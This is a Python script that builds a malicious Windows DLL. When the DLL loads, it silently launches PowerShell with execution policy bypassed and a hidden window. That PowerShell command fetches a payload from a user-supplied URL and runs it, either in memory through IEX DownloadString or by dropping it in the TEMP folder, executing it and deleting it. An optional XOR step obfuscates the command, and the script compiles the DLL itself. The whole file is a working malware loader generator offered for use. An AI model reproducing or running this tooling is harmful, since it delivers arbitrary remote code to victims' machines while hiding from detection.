import subprocess
import os
import urllib.parse

def build_dll(payload_url, output_name, obfuscate, version):
    # Define the base command depending on the version
    if version == 1:
        # PowerShell one-liner to execute the payload in memory
        one_liner = f"IEX (New-Object Net.WebClient).DownloadString('{payload_url}')"
    else:
        # Command to download, execute, wait, and delete
        payload_name = urllib.parse.urlsplit(payload_url).path.split('/')[-1]
        temp_path = f"$env:TEMP\\{payload_name}"
        one_liner = f"(New-Object Net.WebClient).DownloadFile('{payload_url}', '{temp_path}'); Start-Process '{temp_path}'; Start-Sleep -Seconds 4; Remove-Item '{temp_path}'"

    # Optionally obfuscate the PowerShell command
    if obfuscate:
        # Simple XOR encoding for obfuscation example
        obfuscated_command = ''.join([f"\\x{ord(c) ^ 0xAA:02X}" for c in one_liner])
    else:
        obfuscated_command = one_liner

    # Decryption code to handle obfuscated command
    decryption_code = """
std::string DecryptCommand(const std::string& encrypted) {
    std::string decrypted;
    for (char c : encrypted) {
        decrypted += c ^ 0xAA; // XOR decryption with a simple key
    }
    return decrypted;
}
"""

    # C++ code for the DLL
    cpp_code = f"""
#include <windows.h>
#include <string>
#include <thread>

{decryption_code}

// Executes the PowerShell command in a new process
void ExecuteCommand(const std::string& command) {{
    STARTUPINFO si = {{ sizeof(STARTUPINFO) }};
    PROCESS_INFORMATION pi;
    std::string psCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \\"" + command + "\\"";
    
    if (CreateProcess(NULL, const_cast<LPSTR>(psCommand.c_str()), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {{
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }} else {{
        // Handle error if CreateProcess fails
        MessageBox(NULL, "Failed to execute PowerShell command.", "Error", MB_OK | MB_ICONERROR);
    }}
}}

// Function to be run in a separate thread to execute PowerShell command
DWORD WINAPI RunPowerShellCommand(LPVOID lpParam) {{
    // Encrypted PowerShell command
    std::string encryptedCommand = *static_cast<std::string*>(lpParam);
    std::string command = DecryptCommand(encryptedCommand);
    ExecuteCommand(command);
    return 0;
}}

// Entry point for the DLL
extern "C" BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
    case DLL_PROCESS_ATTACH: {{
        // Start the PowerShell command execution in a new thread
        static std::string encryptedCommand = "{obfuscated_command}"; // Placeholder for the obfuscated command
        HANDLE hThread = CreateThread(NULL, 0, RunPowerShellCommand, &encryptedCommand, 0, NULL);
        if (hThread) {{
            CloseHandle(hThread); // Close the handle to the thread
        }}
        break;
    }}
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }}
    return TRUE;
}}
"""

    # Save the C++ code to a file for compilation
    cpp_file = "PowerShellRunner.cpp"
    with open(cpp_file, "w") as file:
        file.write(cpp_code)

    # Compile the C++ source code into a DLL
    compile_command = f"cl /LD {cpp_file} /link /OUT:{output_name}.dll"
    result = subprocess.run(compile_command, shell=True, capture_output=True, text=True)

    # Check if the compilation was successful
    if result.returncode == 0:
        print(f"DLL built successfully and saved as {output_name}.dll!")
    else:
        print("Compilation failed:")
        print(result.stderr)

    # Clean up the .cpp file
    os.remove(cpp_file)

if __name__ == "__main__":
    # Prompt for the URL of the payload
    payload_url = input("Enter the URL of the payload: ").strip()

    # Ask for the output DLL name
    output_name = input("Enter the desired output DLL name (without extension): ").strip()

    # Ask if obfuscation is needed
    obfuscate = input("Do you want to obfuscate the PowerShell command? (yes/no): ").strip().lower() == 'yes'

    # Ask for version 1 or version 2
    print("Choose execution method:")
    print("1 - Fileless/Run In Memory")
    print("2 - Run in Temp/On Disk")
    version = int(input("Enter 1 or 2: ").strip())

    build_dll(payload_url, output_name, obfuscate, version)
